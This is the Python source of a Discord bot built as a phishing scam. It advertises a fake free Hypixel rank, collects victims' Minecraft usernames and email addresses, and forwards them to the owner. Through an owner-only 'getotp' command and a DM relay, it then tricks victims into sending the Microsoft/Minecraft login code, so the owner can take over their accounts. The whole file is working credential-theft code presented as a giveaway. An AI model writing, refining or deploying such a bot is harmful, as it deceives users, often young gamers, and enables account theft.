import discord
from discord.ext import commands
import random
import os

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='*', intents=intents)

OWNER_ID = 1101467683083530331  # Your Discord ID
user_otps = {}
pending_otps = {}
recent_dm_cache = {}  # <-- ADD THIS

@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user}')

@bot.command()
async def panel(ctx, arg):
    if arg == "secret09":
        embed = discord.Embed(
            title="🎁 Claim Your Free Hypixel Rank!",
            description=(
                "**Follow these steps:**\n"
                "1. Click the button below.\n"
                "2. Submit your Minecraft username and email.\n"
                "3. Wait 24 hours to get an OTP via DM.\n"
                "4. Submit the OTP to receive your Hypixel rank!\n\n"
                "> ⚠️ **Note:** Only genuine submissions will be processed."
            ),
            color=discord.Color.green()
        )
        view = ClaimView()
        await ctx.send(embed=embed, view=view)

class ClaimView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Claim Your Rank", style=discord.ButtonStyle.success)
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(ClaimModal())

class ClaimModal(discord.ui.Modal, title="Claim Your Free Rank"):
    username = discord.ui.TextInput(label="Minecraft Username", placeholder="e.g., DreamNotFound", required=True)
    email = discord.ui.TextInput(label="Email Address", placeholder="e.g., your@email.com", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = interaction.user.id
        otp = str(random.randint(100000, 999999))
        user_otps[user_id] = otp

        owner = await bot.fetch_user(OWNER_ID)
        await owner.send(
            f"📥 **New Rank Claim Submitted!**\n"
            f"> **Discord ID:** `{user_id}`\n"
            f"> **Username:** `{self.username}`\n"
            f"> **Email:** `{self.email}`\n\n"
            f"✅ OTP for user: `{otp}` (sent to user via DM)."
        )

        try:
            await interaction.user.send(
                f"👋 Here is your OTP to verify for Hypixel Rank:\n\n**{otp}**\n\n"
                "Please type `*confirmotp <otp>` in the server."
            )
            await interaction.response.send_message("✅ Info submitted! Check your DMs for OTP.", ephemeral=True)
        except:
            await interaction.response.send_message("❌ I couldn't DM you. Please enable DMs.", ephemeral=True)

@bot.command()
async def tell(ctx, user_id: int, *, message):
    if ctx.author.id != OWNER_ID:
        return await ctx.reply("❌ You are not authorized to use this command.", delete_after=8)

    try:
        user = await bot.fetch_user(user_id)
        await user.send(f"📬 **Message from Admin:**\n{message}")
        await ctx.reply(f"✅ Message sent to `{user}`.", delete_after=8)
    except discord.Forbidden:
        await ctx.reply("❌ Couldn't DM the user. They might have DMs off.", delete_after=8)
    except:
        await ctx.reply("❌ Failed to send message. Invalid user ID or unknown error.", delete_after=8)

@bot.command()
async def confirmotp(ctx, otp_input):
    actual_otp = user_otps.get(ctx.author.id)

    try:
        await ctx.message.delete(delay=1)
    except:
        pass

    if actual_otp is None:
        msg = await ctx.send("❌ You haven't submitted a form yet. Use the panel first.")
        await msg.delete(delay=8)
    elif otp_input == actual_otp:
        msg = await ctx.send("🎉 OTP Verified! You’ll receive your Hypixel Rank soon.")
        await msg.delete(delay=8)

        owner = await bot.fetch_user(OWNER_ID)
        await owner.send(
            f"✅ **OTP Verified Successfully**\n"
            f"User: `{ctx.author}` (ID: `{ctx.author.id}`) has successfully confirmed their OTP "
            f"and completed the form."
        )

        del user_otps[ctx.author.id]
    else:
        msg = await ctx.send("❌ Incorrect OTP. Try again.")
        await msg.delete(delay=8)

@bot.command()
async def getotp(ctx, user_id: int):
    if ctx.author.id != OWNER_ID:
        return await ctx.reply("❌ You are not authorized to use this command.")

    user = await bot.fetch_user(user_id)
    if not user:
        return await ctx.reply("❌ Couldn't find that user.")

    try:
        await user.send(
            f"👋 Please send me the **OTP you received from Minecraft/Microsoft** to complete your rank claim.\n\n"
            f"Reply here with your OTP only."
        )
        pending_otps[user.id] = ctx.author.id
        await ctx.reply("📨 User has been prompted to send their OTP.")
    except:
        await ctx.reply("❌ Couldn't DM the user.")

@bot.event
async def on_message(message):
    await bot.process_commands(message)  # Process commands first

    if not isinstance(message.channel, discord.DMChannel):  # Only handle DMs here
        return
    if message.author.bot:  # Ignore bots including yourself
        return

    user_id = message.author.id
    content = message.content.strip()
    owner = await bot.fetch_user(OWNER_ID)

    try:
        if user_id in pending_otps:
            # OTP flow
            await owner.send(f"📨 **OTP Received from {message.author} (`{user_id}`):**\n\n`{content}`")
            del pending_otps[user_id]
            try:
                await message.channel.send("✅ Your OTP has been sent to the admin.")
            except:
                pass
        else:
            # Prevent duplicate DMs from same user
            last_sent = recent_dm_cache.get(user_id)
            if last_sent != content:
                await owner.send(f"📩 **New DM from {message.author} (`{user_id}`):**\n```\n{content}\n```")
                recent_dm_cache[user_id] = content
    except Exception as e:
        print(f"Error forwarding DM from {message.author}: {e}")

bot.run(os.environ["TOKEN"])
